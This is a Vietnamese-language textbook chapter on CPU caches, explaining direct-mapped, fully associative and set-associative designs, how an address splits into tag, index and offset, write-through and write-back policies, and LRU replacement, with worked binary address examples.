<p>Trong phần tiếp theo, chúng ta sẽ mô tả các đặc điểm của cache và giải thích các cơ chế phần cứng giúp việc nhận diện và khai thác locality diễn ra tự động.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="114-cpu-caches"><a class="header" href="#114-cpu-caches">11.4. CPU Caches</a></h2>
<p>Sau khi đã <a href="C11-MemHierarchy/devices.html#_storage_devices">phân loại các thiết bị lưu trữ</a> và nhận ra các mẫu quan trọng của <a href="C11-MemHierarchy/locality.html#_locality">temporal locality và spatial locality</a>, giờ chúng ta sẵn sàng tìm hiểu cách CPU cache được thiết kế và triển khai.<br />
<strong>Cache</strong> là một thiết bị lưu trữ nhỏ, tốc độ cao nằm trên CPU, chứa một tập con giới hạn của dữ liệu từ bộ nhớ chính (main memory).<br />
Cache phải đối mặt với một số câu hỏi thiết kế quan trọng:</p>
<ul>
<li><strong>Nên chứa</strong> tập con nào của bộ nhớ chương trình?</li>
<li><strong>Khi nào</strong> cache nên sao chép một phần dữ liệu từ bộ nhớ chính vào cache, hoặc ngược lại?</li>
<li><strong>Làm thế nào</strong> hệ thống xác định được dữ liệu của chương trình có đang nằm trong cache hay không?</li>
</ul>
<p>Trước khi đi sâu vào các câu hỏi này, chúng ta cần giới thiệu một số hành vi và thuật ngữ liên quan đến cache.<br />
Hãy nhớ rằng khi truy cập dữ liệu trong bộ nhớ, chương trình trước tiên sẽ <a href="C11-MemHierarchy/../C8-IA32/basics.html#_instruction_structure">tính toán địa chỉ bộ nhớ của dữ liệu</a>.<br />
Lý tưởng nhất là dữ liệu tại địa chỉ mong muốn đã có sẵn trong cache, cho phép chương trình bỏ qua việc truy cập bộ nhớ chính.<br />
Để tối đa hóa hiệu năng, phần cứng sẽ đồng thời gửi địa chỉ cần truy cập tới <strong>cả cache và bộ nhớ chính</strong>.<br />
Vì cache nhanh hơn và gần ALU hơn, nó sẽ phản hồi nhanh hơn nhiều so với bộ nhớ chính.<br />
Nếu dữ liệu có trong cache (<strong>cache hit</strong>), phần cứng cache sẽ hủy yêu cầu truy cập bộ nhớ đang chờ, vì cache có thể cung cấp dữ liệu nhanh hơn.</p>
<p>Ngược lại, nếu dữ liệu không có trong cache (<strong>cache miss</strong>), CPU buộc phải chờ bộ nhớ chính trả về dữ liệu.<br />
Điểm quan trọng là khi yêu cầu tới bộ nhớ chính hoàn tất, CPU sẽ nạp dữ liệu vừa lấy được vào cache để các yêu cầu tiếp theo tới cùng địa chỉ đó (rất có khả năng xảy ra nhờ <strong>temporal locality</strong>) có thể được phục vụ nhanh chóng từ cache.<br />
Ngay cả khi thao tác bộ nhớ gây ra miss là <strong>ghi</strong> dữ liệu, CPU vẫn nạp giá trị đó vào cache, vì nhiều khả năng chương trình sẽ truy cập lại vị trí này trong tương lai.</p>
<p>Khi nạp dữ liệu vào cache sau một lần miss, CPU thường thấy cache không còn đủ chỗ trống.<br />
Trong trường hợp này, cache phải <strong>evict</strong> (loại bỏ) một số dữ liệu đang có để nhường chỗ cho dữ liệu mới.<br />
Vì cache lưu các bản sao dữ liệu từ bộ nhớ chính, nếu dữ liệu bị loại bỏ đã bị sửa đổi, cache phải ghi lại nội dung đó về bộ nhớ chính trước khi xóa nó khỏi cache.</p>
<p>Để cung cấp đầy đủ các chức năng trên, các nhà thiết kế cache thường áp dụng một trong ba kiến trúc.<br />
Phần này bắt đầu với <em>direct-mapped cache</em>, loại đơn giản hơn so với các thiết kế khác.</p>
<h3 id="1141-direct-mapped-caches"><a class="header" href="#1141-direct-mapped-caches">11.4.1. Direct-Mapped Caches</a></h3>
<p>Một <strong>direct-mapped cache</strong> chia không gian lưu trữ của nó thành các đơn vị gọi là <strong>cache line</strong>.<br />
Tùy vào kích thước, cache có thể chứa hàng chục, hàng trăm hoặc thậm chí hàng nghìn cache line.<br />
Trong direct-mapped cache, mỗi cache line độc lập với các line khác và chứa hai loại thông tin quan trọng: <strong>cache data block</strong> và <strong>metadata</strong>.</p>
<ol>
<li>
<p><strong>Cache data block</strong> (thường gọi tắt là <strong>cache block</strong>) lưu một tập con dữ liệu chương trình từ bộ nhớ chính.<br />
Cache block lưu các khối dữ liệu nhiều byte để tận dụng <a href="C11-MemHierarchy/locality.html#_spatial_locality">spatial locality</a>.<br />
Kích thước cache block quyết định đơn vị dữ liệu được truyền giữa cache và bộ nhớ chính.<br />
Nghĩa là, khi nạp dữ liệu từ bộ nhớ vào cache, cache luôn nhận một khối dữ liệu có kích thước bằng cache block.</p>
<p>Các nhà thiết kế cache phải cân bằng giữa hai yếu tố khi chọn kích thước block.<br />
Với dung lượng lưu trữ cố định, cache có thể chứa nhiều block nhỏ hơn hoặc ít block lớn hơn.<br />
Block lớn giúp cải thiện hiệu năng cho các chương trình có spatial locality tốt, trong khi nhiều block hơn cho phép cache lưu trữ đa dạng hơn các vùng bộ nhớ.<br />
Chiến lược nào tốt hơn phụ thuộc vào đặc thù tải công việc của ứng dụng.<br />
Vì CPU đa dụng không thể giả định trước về ứng dụng, cache của CPU hiện đại thường chọn kích thước block trung bình, khoảng 16–64 byte.</p>
</li>
<li>
<p><strong>Metadata</strong> lưu thông tin về nội dung của cache block.<br />
Metadata <strong>không</strong> chứa dữ liệu chương trình, mà lưu thông tin quản lý cho cache line (ví dụ: giúp xác định cache block này chứa phần nào của bộ nhớ).</p>
</li>
</ol>
<p>Khi chương trình cố truy cập một địa chỉ bộ nhớ, cache cần biết phải tìm ở đâu để lấy dữ liệu tương ứng, kiểm tra xem dữ liệu có sẵn ở vị trí đó trong cache hay không, và nếu có thì trả về phần dữ liệu cần thiết cho ứng dụng.<br />
Quy trình này gồm các bước sau.</p>
<h4 id="xác-định-vị-trí-dữ-liệu-trong-cache"><a class="header" href="#xác-định-vị-trí-dữ-liệu-trong-cache">Xác định vị trí dữ liệu trong cache</a></h4>
<p>Cache phải nhanh chóng xác định xem tập con bộ nhớ tương ứng với địa chỉ yêu cầu có đang nằm trong cache hay không.<br />
Để làm điều này, cache trước tiên phải xác định cache line cần kiểm tra.<br />
Trong direct-mapped cache, <strong>mỗi địa chỉ bộ nhớ ánh xạ tới đúng một cache line duy nhất</strong>.<br />
Điều này giải thích tên gọi <em>direct-mapped</em> — ánh xạ trực tiếp mỗi địa chỉ bộ nhớ tới một cache line.</p>
<p><strong>Hình 1</strong> minh họa cách các địa chỉ bộ nhớ ánh xạ tới cache line trong một direct-mapped cache nhỏ có 4 cache line và kích thước cache block là 32 byte.<br />
Hãy nhớ rằng kích thước block của cache là đơn vị truyền dữ liệu nhỏ nhất giữa cache và bộ nhớ chính.<br />
Do đó, mỗi địa chỉ bộ nhớ thuộc về một khoảng 32 byte, và mỗi khoảng này ánh xạ tới một cache line.</p>
<p><img src="C11-MemHierarchy/_images/DirectMapping.png" alt="Each 32-byte region of memory maps to one cache line in a repeating striped pattern. That is, memory regions 0, 4, 8, ...​ map to line 0, regions 1, 5, 9, ...​ map to line 1, regions 2, 6, 10, ...​ map to line 2, and regions 3, 7, 11, ...​ map to line 3." /></p>
<p><strong>Hình 1.</strong> Ví dụ ánh xạ địa chỉ bộ nhớ tới cache line trong direct-mapped cache 4 line với cache block 32 byte.</p>
<p>Lưu ý rằng mặc dù mỗi vùng bộ nhớ chỉ ánh xạ tới một cache line, nhưng nhiều vùng bộ nhớ khác nhau có thể ánh xạ tới <strong>cùng một</strong> cache line.<br />
Tất cả các vùng bộ nhớ ánh xạ tới cùng một cache line (tức các khối cùng màu trong Hình 1) sẽ cạnh tranh không gian trong line đó, nên tại một thời điểm chỉ một vùng của mỗi màu có thể nằm trong cache.</p>
<p>Cache ánh xạ một địa chỉ bộ nhớ tới cache line bằng cách sử dụng một phần bit trong địa chỉ bộ nhớ.<br />
Để phân bố dữ liệu đồng đều hơn giữa các cache line, cache sử dụng các bit ở <strong>giữa</strong> địa chỉ bộ nhớ, gọi là <strong>index</strong> của địa chỉ, để xác định line mà địa chỉ đó ánh xạ tới.<br />
Số bit dùng làm index (thay đổi tùy thiết kế) quyết định số lượng line mà cache có thể chứa.<br />
<a href="C11-MemHierarchy/caching.html#FigAddressIndex">Hình 2</a> minh họa phần index của một địa chỉ bộ nhớ trỏ tới một cache line.</p>
<p><img src="C11-MemHierarchy/_images/AddressIndex.png" alt="An address is divided into three regions, and the middle region points to one row (cache line) of a table (direct-mapped cache)." /></p>
<p><strong>Hình 2.</strong> Phần <em>index</em> ở giữa của một địa chỉ bộ nhớ xác định một cache line.</p>
<p>Việc sử dụng các bit ở giữa địa chỉ giúp giảm cạnh tranh cho cùng một cache line khi dữ liệu chương trình được lưu trữ gần nhau — điều này thường xảy ra với các chương trình có <strong>locality</strong> tốt.<br />
Nói cách khác, các chương trình thường lưu các biến gần nhau trong một vài vùng bộ nhớ nhất định (ví dụ: trên stack hoặc heap).<br />
Những biến được lưu gần nhau này sẽ có cùng các bit bậc cao (high-order bits) trong địa chỉ.<br />
Nếu dùng các bit bậc cao để làm index, tất cả các biến này sẽ ánh xạ tới cùng một nhóm cache line, khiến phần còn lại của cache không được sử dụng.<br />
Bằng cách dùng các bit ở giữa địa chỉ, cache có thể phân bổ dữ liệu đồng đều hơn giữa các cache line hiện có.</p>
<h3 id="xác-định-nội-dung-của-cache"><a class="header" href="#xác-định-nội-dung-của-cache">Xác định nội dung của Cache</a></h3>
<p>Sau khi đã xác định được cache line phù hợp, cache cần biết liệu line đó có chứa địa chỉ được yêu cầu hay không.<br />
Vì nhiều vùng bộ nhớ khác nhau có thể ánh xạ tới cùng một cache line, cache sẽ kiểm tra <strong>metadata</strong> của line để trả lời hai câu hỏi quan trọng:</p>
<ul>
<li><em>Cache line này có chứa một tập con hợp lệ của bộ nhớ không?</em></li>
<li><em>Nếu có, trong số nhiều tập con ánh xạ tới cache line này, nó hiện đang chứa tập con nào?</em></li>
</ul>
<p>Để trả lời, metadata của mỗi cache line sẽ bao gồm <strong>valid bit</strong> và <strong>tag</strong>:</p>
<ul>
<li>
<p><strong>Valid bit</strong>: là một bit cho biết line hiện có đang lưu một tập con hợp lệ của bộ nhớ hay không (valid = 1 nghĩa là hợp lệ).<br />
Một line không hợp lệ (valid = 0) sẽ không bao giờ tạo ra cache hit vì chưa có dữ liệu nào được nạp vào.<br />
Các line không hợp lệ thực chất là vùng trống trong cache.</p>
</li>
<li>
<p><strong>Tag</strong>: xác định duy nhất tập con bộ nhớ mà cache block trong line đang lưu.<br />
Tag lưu các bit bậc cao của dải địa chỉ được lưu trong cache line, cho phép cache biết dữ liệu này đến từ đâu trong bộ nhớ.<br />
Vì nhiều tập con bộ nhớ có thể ánh xạ tới cùng một cache line (có cùng index bits), tag sẽ ghi lại tập con nào hiện đang có mặt.</p>
</li>
</ul>
<p>Để một lần tra cứu cache tạo ra <strong>hit</strong>, tag lưu trong cache line phải <strong>khớp chính xác</strong> với phần tag (các bit bậc cao) của địa chỉ bộ nhớ được yêu cầu.<br />
Nếu tag không khớp, nghĩa là cache block trong line đó không chứa dữ liệu cần tìm, ngay cả khi line đang hợp lệ.</p>
<p><strong>Hình 3</strong> minh họa cách cache chia một địa chỉ bộ nhớ thành <strong>tag</strong> và <strong>index</strong>, dùng index bits để chọn cache line, kiểm tra valid bit, và so sánh tag.</p>
<p><img src="C11-MemHierarchy/_images/AddressTag.png" alt="The cache sends the address's tag to a comparator circuit to check whether it matches the tag stored in the cache line." /><br />
<strong>Hình 3.</strong> Sau khi dùng index bits của địa chỉ để tìm cache line, cache đồng thời kiểm tra valid bit và so sánh tag của line với tag của địa chỉ yêu cầu. Nếu line hợp lệ và tag khớp, đây là một cache hit.</p>
<h3 id="truy-xuất-dữ-liệu-từ-cache"><a class="header" href="#truy-xuất-dữ-liệu-từ-cache">Truy xuất dữ liệu từ Cache</a></h3>
<p>Cuối cùng, sau khi tìm được cache line phù hợp và xác nhận line đó chứa một tập con hợp lệ của bộ nhớ bao gồm địa chỉ yêu cầu, cache sẽ gửi dữ liệu tới các thành phần CPU cần nó.<br />
Vì kích thước cache block (ví dụ: 64 byte) thường lớn hơn nhiều so với lượng dữ liệu chương trình yêu cầu (ví dụ: 4 byte), cache sẽ dùng các bit bậc thấp của địa chỉ làm <strong>offset</strong> để xác định vị trí byte cần lấy trong cache block.</p>
<p><strong>Hình 4</strong> minh họa cách phần offset của địa chỉ xác định byte nào trong cache block sẽ được truy xuất.</p>
<p><img src="C11-MemHierarchy/_images/AddressOffset.png" alt="A subset of the cache data block's cells are highlighted to match the color of an address's offset portion." /><br />
<strong>Hình 4.</strong> Với một cache block, phần offset của địa chỉ xác định byte mà chương trình muốn lấy.</p>
<h3 id="chia-nhỏ-địa-chỉ-bộ-nhớ"><a class="header" href="#chia-nhỏ-địa-chỉ-bộ-nhớ">Chia nhỏ địa chỉ bộ nhớ</a></h3>
<p><strong>Kích thước</strong> (dimensions) của cache quyết định số bit được dùng cho <strong>offset</strong>, <strong>index</strong> và <strong>tag</strong> trong một địa chỉ bộ nhớ.<br />
Ngược lại, số bit của mỗi phần trong địa chỉ cũng cho biết kích thước cache phải như thế nào.<br />
Khi xác định bit nào thuộc phần nào, ta thường xét địa chỉ từ phải sang trái (từ bit ít quan trọng nhất đến bit quan trọng nhất).</p>
<ul>
<li>
<p><strong>Offset</strong>: phần ngoài cùng bên phải của địa chỉ, độ dài phụ thuộc vào kích thước cache block.<br />
Offset phải đủ bit để tham chiếu tới mọi byte trong một cache block.<br />
Ví dụ: nếu cache block là 32 byte, cần 5 bit offset (vì log₂32 = 5) để xác định chính xác byte nào trong block.<br />
Ngược lại, nếu offset là 4 bit, cache block sẽ có kích thước 16 byte (2⁴ = 16).</p>
</li>
<li>
<p><strong>Index</strong>: nằm ngay bên trái offset.<br />
Số bit index phụ thuộc vào số lượng cache line, vì index phải đủ để xác định duy nhất từng line.<br />
Ví dụ: cache có 1.024 line cần 10 bit index (log₂1024 = 10).<br />
Nếu index là 12 bit, cache sẽ có 4.096 line (2¹² = 4.096).</p>
</li>
</ul>
<p><img src="C11-MemHierarchy/_images/AddressBits.png" alt="With i index bits, an address can refer to 2^i^ lines. With f offset bits, an address can refer to 2^f^ bytes in a cache data block." /><br />
<strong>Hình 5.</strong> Index xác định duy nhất một cache line, offset xác định vị trí byte trong cache block.</p>
<ul>
<li><strong>Tag</strong>: phần còn lại của địa chỉ.<br />
Tag phải đủ để xác định duy nhất tập con bộ nhớ trong cache line.<br />
Ví dụ: với địa chỉ 32-bit, cache có 5 bit offset và 10 bit index thì tag sẽ chiếm 17 bit còn lại (32 - 15 = 17).</li>
</ul>
<h3 id="ví-dụ-đọc-trong-direct-mapped-cache"><a class="header" href="#ví-dụ-đọc-trong-direct-mapped-cache">Ví dụ đọc trong Direct-Mapped Cache</a></h3>
<p>Xét một CPU có các đặc điểm:</p>
<ul>
<li>Địa chỉ bộ nhớ 16-bit</li>
<li>Direct-mapped cache với 128 cache line</li>
<li>Cache block 32 byte</li>
</ul>
<p>Cache ban đầu trống (tất cả line đều invalid), như <strong>Hình 6</strong>.</p>
<p><img src="C11-MemHierarchy/_images/DirectExample0.png" alt="A cache with lines marked from 0 to 127. Each line is currently invalid." /><br />
<strong>Hình 6.</strong> Ví dụ cache direct-mapped trống</p>
<p>Giả sử chương trình truy cập các địa chỉ:</p>
<ol>
<li>Đọc từ <code>1010000001100100</code></li>
<li>Đọc từ <code>1010000001100111</code></li>
<li>Đọc từ <code>1001000000100000</code></li>
<li>Đọc từ <code>1111000001100101</code></li>
</ol>
<p>Để lần theo toàn bộ chuỗi truy cập, thực hiện các bước:</p>
<ol>
<li>Chia địa chỉ thành 3 phần từ phải sang trái: <strong>offset</strong> trong cache block, <strong>index</strong> của cache line, và <strong>tag</strong> để xác định tập con bộ nhớ.</li>
<li>Dùng phần index để tìm cache line mà địa chỉ ánh xạ tới.</li>
<li>Kiểm tra valid bit của line. Nếu invalid → cache miss, bất kể tag là gì.</li>
<li>Kiểm tra tag. Nếu tag khớp và line hợp lệ → cache hit. Nếu không → cache miss và phải nạp dữ liệu từ bộ nhớ chính vào line đó.</li>
<li>Nếu hit, dùng offset để lấy đúng byte dữ liệu từ cache block (bước này không minh họa trong ví dụ).</li>
</ol>
<h5 id="chia-nhỏ-địa-chỉ-address-division"><a class="header" href="#chia-nhỏ-địa-chỉ-address-division">Chia nhỏ địa chỉ (Address Division)</a></h5>
<p>Bắt đầu bằng việc xác định cách chia địa chỉ bộ nhớ thành ba phần: <em>offset</em>, <em>index</em> và <em>tag</em>.<br />
Xét các phần của địa chỉ từ bit bậc thấp đến bit bậc cao (từ phải sang trái):</p>
<ul>
<li>
<p><strong>Offset</strong>: Kích thước block là 32 byte nghĩa là 5 bit ngoài cùng bên phải của địa chỉ (log₂ 32 = 5) tạo thành phần offset. Với 5 bit, offset có thể xác định duy nhất bất kỳ byte nào trong 32 byte của block.</p>
</li>
<li>
<p><strong>Index</strong>: Cache có 128 line nghĩa là 7 bit tiếp theo của địa chỉ (log₂ 128 = 7) tạo thành phần index. Với 7 bit, index có thể xác định duy nhất từng cache line.</p>
</li>
<li>
<p><strong>Tag</strong>: Tag bao gồm tất cả các bit còn lại của địa chỉ không thuộc offset hoặc index. Ở đây, địa chỉ còn lại 4 bit tạo thành tag (16 - (5 + 7) = 4).</p>
</li>
</ul>
<p><img src="C11-MemHierarchy/_images/DirectExample1.png" alt="Result: miss, the line was invalid prior to access." /><br />
<strong>Hình 7.</strong> Đọc từ địa chỉ <code>1010000001100100</code>. Index <code>0000011</code> (line 3) không hợp lệ, nên yêu cầu bị miss và cache nạp dữ liệu từ bộ nhớ chính.</p>
<p><img src="C11-MemHierarchy/_images/DirectExample2.png" alt="Result: hit, the line is valid, and the tag matches." /><br />
<strong>Hình 8.</strong> Đọc từ địa chỉ <code>1010000001100111</code>. Index <code>0000011</code> (line 3) hợp lệ và tag (<code>1010</code>) khớp, nên yêu cầu hit. Cache trả về dữ liệu bắt đầu tại byte 7 (offset <code>0b00111</code>) của block dữ liệu.</p>
<p><img src="C11-MemHierarchy/_images/DirectExample3.png" alt="Result: miss, the line was invalid prior to access." /><br />
<strong>Hình 9.</strong> Đọc từ địa chỉ <code>1001000000100000</code>. Index <code>0000001</code> (line 1) không hợp lệ, nên yêu cầu bị miss và cache nạp dữ liệu từ bộ nhớ chính.</p>
<p><img src="C11-MemHierarchy/_images/DirectExample4.png" alt="Result: miss, the line is valid, but the tag doesn't match." /><br />
<strong>Hình 10.</strong> Đọc từ địa chỉ <code>1111000001100101</code>. Index <code>0000011</code> (line 3) hợp lệ nhưng tag không khớp, nên yêu cầu bị miss và cache nạp dữ liệu từ bộ nhớ chính.</p>
<h4 id="ghi-dữ-liệu-vào-cache-writing-to-cached-data"><a class="header" href="#ghi-dữ-liệu-vào-cache-writing-to-cached-data">Ghi dữ liệu vào Cache (Writing to Cached Data)</a></h4>
<p>Cho đến giờ, phần này chủ yếu xét các thao tác đọc bộ nhớ, khi CPU tra cứu dữ liệu trong cache.<br />
Cache cũng phải cho phép chương trình ghi dữ liệu, và hỗ trợ thao tác ghi theo một trong hai chiến lược:</p>
<ol>
<li>
<p><strong>Write-through cache</strong>: Mỗi thao tác ghi sẽ cập nhật giá trị trong cache <strong>đồng thời</strong> ghi ngay xuống bộ nhớ chính. Nghĩa là dữ liệu trong cache và bộ nhớ chính luôn được đồng bộ ngay lập tức.</p>
</li>
<li>
<p><strong>Write-back cache</strong>: Mỗi thao tác ghi chỉ cập nhật giá trị trong cache block, <strong>không</strong> ghi ngay xuống bộ nhớ chính. Do đó, sau khi ghi, dữ liệu trong cache có thể khác với dữ liệu tương ứng trong bộ nhớ chính.</p>
</li>
</ol>
<p>Để xác định cache block nào có dữ liệu khác so với bộ nhớ chính, mỗi line trong write-back cache lưu thêm một bit metadata gọi là <strong>dirty bit</strong>.<br />
Khi cần <strong>evict</strong> (loại bỏ) một cache block từ line có dirty bit = 1, cache phải ghi dữ liệu đó xuống bộ nhớ chính trước để đồng bộ.</p>
<p><strong>Hình 11</strong> minh họa một direct-mapped cache có thêm dirty bit để đánh dấu các line cần ghi xuống bộ nhớ khi bị evict.</p>
<p><img src="C11-MemHierarchy/_images/CacheDirty.png" alt="The dirty bit is a one-bit flag that indicates whether the data stored in a cache line has been written. When set, the data in the cache is out of sync with main memory and must be written back to memory before eviction." /><br />
<strong>Hình 11.</strong> Cache mở rộng với dirty bit</p>
<p>Như thường lệ, sự khác biệt giữa hai thiết kế thể hiện sự đánh đổi:</p>
<ul>
<li>Write-through cache đơn giản hơn write-back cache và không cần lưu thêm metadata (dirty bit) cho mỗi line.</li>
<li>Write-back cache giảm chi phí khi ghi lặp lại nhiều lần vào cùng một vị trí bộ nhớ.</li>
</ul>
<p>Ví dụ: nếu một chương trình liên tục cập nhật cùng một biến mà biến đó không bao giờ bị loại khỏi cache, write-through cache sẽ ghi xuống bộ nhớ chính <strong>mỗi lần</strong> cập nhật, dù các lần sau chỉ ghi đè giá trị trước đó.<br />
Ngược lại, write-back cache chỉ ghi xuống bộ nhớ khi block đó bị evict.<br />
Vì việc phân bổ chi phí truy cập bộ nhớ cho nhiều lần ghi giúp cải thiện hiệu năng đáng kể, hầu hết cache hiện đại chọn thiết kế write-back.</p>
<h4 id="ví-dụ-ghi-trong-direct-mapped-cache-write-back"><a class="header" href="#ví-dụ-ghi-trong-direct-mapped-cache-write-back">Ví dụ ghi trong Direct-Mapped Cache (Write-Back)</a></h4>
<p>Ghi vào cache hoạt động tương tự đọc, nhưng sẽ <strong>set dirty bit</strong> của cache line bị sửa đổi.<br />
Khi evict một cache line có dirty bit = 1, cache phải ghi block dữ liệu đó xuống bộ nhớ trước khi loại bỏ.</p>
<p>Giả sử ví dụ trước tiếp tục với hai thao tác bộ nhớ:</p>
<ol start="5">
<li>Ghi vào địa chỉ: <code>1111000001100000</code></li>
<li>Ghi vào địa chỉ: <code>1010000001100100</code></li>
</ol>
<p><img src="C11-MemHierarchy/_images/DirectExample5.png" alt="Result: hit, the line is valid, and the tag matches. Set dirty bit to 1 on write." /><br />
<strong>Hình 12.</strong> Ghi vào địa chỉ <code>1111000001100000</code>. Index <code>0000011</code> (line 3) hợp lệ và tag (<code>1111</code>) khớp, nên yêu cầu hit. Vì đây là thao tác ghi, cache set dirty bit của line này thành 1.</p>
<p><img src="C11-MemHierarchy/_images/DirectExample6.png" alt="Result: miss, the line is valid, but the tag doesn't match. Save cache data block to memory before evicting it. Set dirty bit to 1 on write (again)." /><br />
<strong>Hình 13.</strong> Ghi vào địa chỉ <code>1010000001100100</code>. Index <code>0000011</code> (line 3) hợp lệ nhưng tag không khớp, nên yêu cầu miss. Vì line này vừa hợp lệ vừa dirty, cache phải ghi block dữ liệu hiện tại xuống bộ nhớ chính trước khi nạp block mới. Đây là thao tác ghi, nên cache set dirty bit của line mới thành 1.</p>
<p>Trong lần truy cập bộ nhớ thứ tư và thứ sáu của ví dụ, cache phải evict dữ liệu vì hai vùng bộ nhớ cạnh tranh cùng một cache line.<br />
Tiếp theo, chúng ta sẽ tìm hiểu một thiết kế cache khác nhằm giảm loại cạnh tranh này.</p>
<hr />
<h3 id="1142-cache-misses-và-các-thiết-kế-associative"><a class="header" href="#1142-cache-misses-và-các-thiết-kế-associative">11.4.2. Cache Misses và Các thiết kế Associative</a></h3>
<p>Các nhà thiết kế cache hướng tới mục tiêu tối đa hóa <strong>hit rate</strong> (tỉ lệ truy cập trúng) để càng nhiều yêu cầu bộ nhớ càng tránh được việc phải truy cập bộ nhớ chính.<br />
Mặc dù tính <strong>locality</strong> mang lại hy vọng đạt được hit rate cao, nhưng trong thực tế, cache không thể mong đợi sẽ hit ở mọi lần truy cập vì nhiều lý do:</p>
<ul>
<li>
<p><strong>Compulsory misses</strong> hay <strong>cold-start misses</strong>: Nếu một chương trình chưa từng truy cập một vị trí bộ nhớ (hoặc bất kỳ vị trí nào gần đó), gần như chắc chắn dữ liệu tại vị trí đó sẽ không có trong cache. Do đó, chương trình thường không thể tránh được cache miss khi lần đầu truy cập các địa chỉ bộ nhớ mới.</p>
</li>
<li>
<p><strong>Capacity misses</strong>: Cache chỉ lưu một tập con của bộ nhớ chính, và lý tưởng nhất là lưu <strong>chính xác</strong> tập con bộ nhớ mà chương trình đang sử dụng. Tuy nhiên, nếu chương trình đang sử dụng nhiều bộ nhớ hơn dung lượng cache, thì chắc chắn không thể tìm thấy <strong>tất cả</strong> dữ liệu cần trong cache, dẫn đến miss.</p>
</li>
<li>
<p><strong>Conflict misses</strong>: Để giảm độ phức tạp khi tìm dữ liệu, một số thiết kế cache giới hạn vị trí dữ liệu có thể được lưu trong cache, và các giới hạn này có thể gây ra miss. Ví dụ, ngay cả khi direct-mapped cache chưa đầy 100%, chương trình vẫn có thể gặp tình huống hai biến được sử dụng thường xuyên lại ánh xạ tới cùng một vị trí cache. Khi đó, mỗi lần truy cập một biến sẽ đẩy biến kia ra khỏi cache vì chúng cạnh tranh cùng một cache line.</p>
</li>
</ul>
<p>Tần suất tương đối của từng loại miss phụ thuộc vào <strong>mẫu truy cập bộ nhớ</strong> của chương trình.<br />
Nhìn chung, nếu không tăng kích thước cache, thiết kế cache chủ yếu ảnh hưởng đến <strong>tỉ lệ conflict miss</strong>.<br />
Mặc dù direct-mapped cache đơn giản hơn các thiết kế khác, nhưng nó chịu ảnh hưởng nặng nhất từ conflict miss.</p>
<p>Giải pháp thay thế direct-mapped cache là <strong>associative cache</strong>.<br />
Thiết kế associative cho phép cache linh hoạt chọn nhiều hơn một vị trí để lưu một vùng bộ nhớ.<br />
Trực giác cho thấy, càng có nhiều lựa chọn vị trí lưu trữ thì khả năng xảy ra conflict càng thấp, nhưng đồng thời độ phức tạp cũng tăng vì phải kiểm tra nhiều vị trí hơn ở mỗi lần truy cập.</p>
<ul>
<li>
<p><strong>Fully associative cache</strong>: Cho phép bất kỳ vùng bộ nhớ nào cũng có thể nằm ở bất kỳ vị trí nào trong cache.<br />
Loại này mang lại sự linh hoạt tối đa, nhưng cũng có độ phức tạp cao nhất khi tra cứu và khi thay thế (eviction), vì phải xem xét tất cả các vị trí cùng lúc.<br />
Mặc dù hữu ích trong một số ứng dụng nhỏ, chuyên biệt (ví dụ: <a href="C11-MemHierarchy/../C13-OS/vm.html#_making_page_accesses_faster">TLB</a>), nhưng độ phức tạp cao khiến nó không phù hợp cho cache của CPU đa dụng.</p>
</li>
<li>
<p><strong>Set associative cache</strong>: Nằm ở mức trung gian giữa direct-mapped và fully associative, phù hợp cho CPU đa dụng.<br />
Trong set associative cache, mỗi vùng bộ nhớ ánh xạ tới <strong>một cache set</strong> duy nhất, nhưng mỗi set chứa nhiều cache line.<br />
Số lượng line trong một set là cố định, thường từ 2 đến 8 line mỗi set.</p>
</li>
</ul>
<h3 id="1143-set-associative-caches"><a class="header" href="#1143-set-associative-caches">11.4.3. Set Associative Caches</a></h3>
<p>Thiết kế set associative là sự cân bằng tốt giữa độ phức tạp và tỉ lệ conflict miss.<br />
Số lượng line trong một set giới hạn số vị trí cần kiểm tra khi tra cứu, và nhiều vùng bộ nhớ ánh xạ tới cùng một set sẽ không gây conflict miss trừ khi toàn bộ set đã đầy.</p>
<p>Trong set associative cache, phần <strong>index</strong> của địa chỉ bộ nhớ ánh xạ địa chỉ đó tới một set các cache line.<br />
Khi tra cứu địa chỉ, cache sẽ <strong>đồng thời</strong> kiểm tra tất cả các line trong set.<br />
<a href="C11-MemHierarchy/caching.html#FigAssocLookup">Hình 14</a> minh họa việc kiểm tra <strong>tag</strong> và <strong>valid bit</strong> trong một cache 2-way set associative.</p>
<p>Nếu bất kỳ line hợp lệ nào trong set có tag khớp với tag của địa chỉ, line đó sẽ hoàn tất quá trình tra cứu.<br />
Khi việc tra cứu thu hẹp xuống chỉ còn một cache line, quá trình sẽ giống như direct-mapped cache: cache dùng <strong>offset</strong> của địa chỉ để gửi byte dữ liệu mong muốn từ cache block tới các thành phần tính toán của CPU.</p>
<p><img src="C11-MemHierarchy/_images/AssocLookup.png" alt="The cache sends the address's tag to two comparator circuits in parallel to check whether it matches the tag stored in either cache line of the set." /><br />
<strong>Hình 14.</strong> Kiểm tra valid bit và so khớp tag trong cache 2-way set associative</p>
<p>Sự linh hoạt bổ sung khi có nhiều cache line trong một set giúp giảm conflict miss, nhưng cũng tạo ra một vấn đề mới: khi nạp dữ liệu vào cache (hoặc khi evict dữ liệu cũ), cache phải quyết định <strong>sử dụng line nào</strong> trong set.</p>
<p>Để giải quyết, cache tận dụng ý tưởng về <strong>locality</strong>.<br />
Cụ thể, <strong>temporal locality</strong> cho thấy dữ liệu được sử dụng gần đây có khả năng sẽ được dùng lại.<br />
Do đó, cache áp dụng chiến lược giống như phần trước khi <a href="C11-MemHierarchy/locality.html#_temporal_locality">quản lý ví dụ tủ sách</a>: khi quyết định line nào trong set sẽ bị thay thế, chọn line <strong>ít được sử dụng gần đây nhất</strong> (<strong>LRU – Least Recently Used</strong>).<br />
LRU được gọi là <strong>cache replacement policy</strong> vì nó điều khiển cơ chế thay thế của cache.</p>
<p>Chính sách LRU yêu cầu mỗi set lưu thêm các bit metadata để xác định line nào ít được sử dụng gần đây nhất.<br />
Số bit cần thiết để code hóa trạng thái LRU tăng theo số lượng line trong set.<br />
Những bit metadata bổ sung này góp phần làm tăng độ phức tạp của thiết kế set associative so với direct-mapped cache.</p>
<p><strong>Hình 15</strong> minh họa một cache 2-way set associative, nghĩa là mỗi set chứa 2 line.<br />
Với chỉ 2 line, mỗi set chỉ cần 1 bit metadata LRU để theo dõi line nào ít được sử dụng gần đây nhất.<br />
Trong hình, giá trị LRU = 0 nghĩa là line bên trái ít được sử dụng gần đây nhất, còn giá trị LRU = 1 nghĩa là line bên phải ít được sử dụng gần đây nhất.</p>
